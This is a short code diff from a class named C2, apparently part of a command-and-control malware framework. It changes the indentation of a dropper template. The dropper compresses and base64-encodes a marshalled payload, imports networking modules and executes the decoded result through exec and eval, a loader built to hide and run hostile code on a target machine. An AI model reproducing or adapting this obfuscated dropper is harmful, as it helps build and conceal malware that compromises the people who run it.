@@ -131,9 +131,9 @@ class C2:
             payload = f.readlines()
             
         dropper = """import sys,zlib,base64,marshal,json,urllib,socketio,geocoder,requests,importlib.util
-        from urllib.request import urlopen
-        urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
-        exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2)))))
+from urllib.request import urlopen
+urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
+exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2)))))
 
         
         system = platform.system()
